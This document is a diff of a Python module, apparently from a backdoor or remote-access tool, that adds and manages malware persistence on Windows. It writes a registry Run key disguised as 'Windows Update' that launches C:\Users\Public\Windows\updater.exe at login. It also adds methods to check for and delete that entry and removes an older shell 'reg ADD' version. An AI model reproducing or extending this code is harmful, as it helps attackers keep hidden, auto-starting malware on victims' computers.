@@ -1,25 +1,34 @@
-import os, _winreg
+import _winreg, sys
 
 class Persistence(object):
-    cmdRegPersistence = 'reg ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Update" /t REG_SZ /d "C:\Users\Public\Windows\updater.exe" /f'
-
+    REG_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    REG_NAME = 'Windows Update'
 
     def doPersistence(self):
-        """try:
-            proc = subprocess.Popen(self.cmdRegPersistence, shell=True, stdout=subprocess.PIPE,
-                                    stderr=subprocess.PIPE,
-                                    stdin=subprocess.PIPE)
-            stdout = proc.stdout.read() + proc.stderr.read()
-            return 'Persitence added. ' + stdout
-        except:
-            return 'There is some problems.'"""
-        REG_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
         try:
-            _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
-            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,
+            _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH)
+            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH, 0,
                                            _winreg.KEY_WRITE)
-            _winreg.SetValueEx(registry_key, 'Windows Update', 0, _winreg.REG_SZ, 'C:\\Users\\Public\\Windows\\updater.exe')
+            _winreg.SetValueEx(registry_key, self.REG_NAME, 0, _winreg.REG_SZ, 'C:\\Users\\Public\\Windows\\updater.exe')
             _winreg.CloseKey(registry_key)
             return 'Persistece added succesfully.\n'
         except WindowsError:
             return 'There are some problems with adding persistence!!!\n'
+
+    def checkPersistence(self):
+        try:
+            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH, 0,
+                                           _winreg.KEY_READ)
+            value = _winreg.QueryValueEx(registry_key, self.REG_NAME)
+            _winreg.CloseKey(registry_key)
+            return "Persistence exist.\n"
+        except WindowsError:
+            return "Persistence not exist.\n"
+
+    def deletePersistence(self):
+        try:
+            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH, 0, _winreg.KEY_ALL_ACCESS)
+            _winreg.DeleteValue(registry_key,self.REG_NAME)
+            return "Persistence deleted.\n"
+        except:
+            return 'There are some problems with deleting persistence!!!\n'
